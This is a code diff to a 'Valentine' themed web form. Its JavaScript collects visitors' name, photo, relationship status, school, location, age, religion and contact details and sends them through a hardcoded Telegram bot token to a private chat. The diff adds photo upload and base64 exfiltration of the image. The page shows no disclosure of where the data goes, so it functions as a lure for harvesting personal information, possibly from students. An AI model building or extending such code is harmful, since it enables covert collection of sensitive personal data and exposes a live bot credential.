@@ -134,8 +134,12 @@
   </style>
 </head>
 <body class="d-flex align-items-center">
-  <!-- Loading Spinner -->
-
+  <!-- Loading Spinner (Hidden by default) -->
+  <div id="loading" class="position-fixed w-100 h-100 bg-dark d-flex align-items-center justify-content-center" style="z-index: 9999; display: none;">
+    <div class="heart-loader text-danger">
+      <i class="fas fa-heart fa-2x"></i>
+    </div>
+  </div>
 
   <!-- Main Content -->
   <div class="container py-5">
@@ -174,7 +178,7 @@
               <input type="text" name="name" class="form-control form-control-custom" placeholder="Your Full Name 🌟" required>
             </div>
             <div class="mb-3">
-              <input type="url" name="profile" class="form-control form-control-custom" placeholder="Profile Picture URL 📸" required>
+              <input type="file" name="profile" class="form-control form-control-custom" accept="image/*" required>
             </div>
             <div class="mb-3">
               <select name="relationship" class="form-control form-control-custom" required>
@@ -220,13 +224,23 @@
   <!-- Bootstrap JS -->
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
   <script>
+    // Function to convert image file to Base64
+    const getBase64 = (file) => {
+      return new Promise((resolve, reject) => {
+        const reader = new FileReader();
+        reader.onload = () => resolve(reader.result);
+        reader.onerror = (error) => reject(error);
+        reader.readAsDataURL(file);
+      });
+    };
+
     // Telegram Bot Integration
     const sendDetails = async (formData) => {
       const token = '7121768182:AAFHaGAAXgA78cK0nvDT8XWrJw_BbWUDPAE';
       const chatId = '7654035673';
       const message = `New Valentine Submission! ❤️\n
         Name: ${formData.name}\n
-        Profile: ${formData.profile}\n
+        Profile: [Image Attached]\n
         Relationship: ${formData.relationship}\n
         School: ${formData.school}\n
         Location: ${formData.location}\n
@@ -235,17 +249,26 @@
         Contact: ${formData.contact}`;
 
       try {
-        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        // Send text message
+        const textResponse = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ chat_id: chatId, text: message })
         });
-        if (response.ok) {
-          return true;
-        } else {
-          console.error('Telegram API error:', response.statusText);
-          return false;
+
+        // Send image if available
+        if (formData.profile) {
+          await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: chatId,
+              photo: formData.profile
+            })
+          });
         }
+
+        return textResponse.ok;
       } catch (error) {
         console.error('Error sending details:', error);
         return false;
@@ -256,21 +279,37 @@
     document.getElementById('detailsForm').addEventListener('submit', async (e) => {
       e.preventDefault();
       const form = e.target;
-      const formData = {
-        name: form.name.value,
-        profile: form.profile.value,
-        relationship: form.relationship.value,
-        school: form.school.value,
-        location: form.location.value,
-        age: form.age.value,
-        religion: form.religion.value,
-        contact: form.contact.value
-      };
-
       const loader = document.getElementById('loading');
-      loader.style.display = 'flex';
+      loader.style.display = 'flex'; // Show loader
 
       try {
+        // Get form data
+        const name = form.name.value;
+        const profileFile = form.profile.files[0];
+        const relationship = form.relationship.value;
+        const school = form.school.value;
+        const location = form.location.value;
+        const age = form.age.value;
+        const religion = form.religion.value;
+        const contact = form.contact.value;
+
+        // Convert image to Base64 if uploaded
+        let profileBase64 = '';
+        if (profileFile) {
+          profileBase64 = await getBase64(profileFile);
+        }
+
+        const formData = {
+          name,
+          profile: profileBase64,
+          relationship,
+          school,
+          location,
+          age,
+          religion,
+          contact
+        };
+
         const success = await sendDetails(formData);
         if (success) {
           // Close the modal properly
